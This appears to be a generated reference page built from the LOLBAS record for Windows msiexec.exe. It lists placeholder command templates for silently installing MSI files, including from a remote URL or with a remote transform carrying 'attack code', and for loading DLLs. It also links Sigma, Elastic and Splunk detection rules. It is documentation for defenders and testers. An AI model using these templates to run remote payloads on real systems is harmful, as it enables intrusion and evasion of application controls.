---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Msiexec.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msiexec.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msiexec.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Msiexec.exe](../../tools/windows/msiexec.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | msiexec.exe |
| name | Msiexec.exe |
| type | tool |
| source | lolbas |
| url | https://badoption.eu/blog/2023/10/03/MSIFortune.html |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@netbiosX'
  Person: netbiosX
- Handle: '@PhilipTsukerman'
  Person: Philip Tsukerman
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: msiexec /quiet /i {PATH:.msi}
  Description: Installs the target .MSI file silently.
  MitreID: T1218.007
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: MSI
  Usecase: Execute custom made msi file with attack code
- Category: Execute
  Command: msiexec /q /i {REMOTEURL}
  Description: Installs the target remote & renamed .MSI file silently.
  MitreID: T1218.007
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: MSI
  - Execute: Remote
  Usecase: Execute custom made msi file with attack code from remote server
- Category: Execute
  Command: msiexec /y {PATH_ABSOLUTE:.dll}
  Description: Calls DllRegisterServer to register the target DLL.
  MitreID: T1218.007
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL
  - Execute: Remote
  Usecase: Execute dll files
- Category: Execute
  Command: msiexec /z {PATH_ABSOLUTE:.dll}
  Description: Calls DllUnregisterServer to un-register the target DLL.
  MitreID: T1218.007
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL
  - Execute: Remote
  Usecase: Execute dll files
- Category: Execute
  Command: msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
  Description: Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a
    transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.
  MitreID: T1218.007
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: MSI
  - Execute: MST
  - Execute: Remote
  Usecase: Install trusted and signed msi file, with additional attack code as transformation file, from a remote server
Created: 2018-05-25
Description: Used by Windows to execute msi files
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml
- IOC: msiexec.exe retrieving files from Internet
Full_Path:
- Path: C:\Windows\System32\msiexec.exe
- Path: C:\Windows\SysWOW64\msiexec.exe
Name: Msiexec.exe
Resources:
- Link: https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
- Link: https://twitter.com/PhilipTsukerman/status/992021361106268161
- Link: https://badoption.eu/blog/2023/10/03/MSIFortune.html
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msiexec.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
```

```text
IOC: msiexec.exe retrieving files from Internet
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml
- IOC: msiexec.exe retrieving files from Internet
```
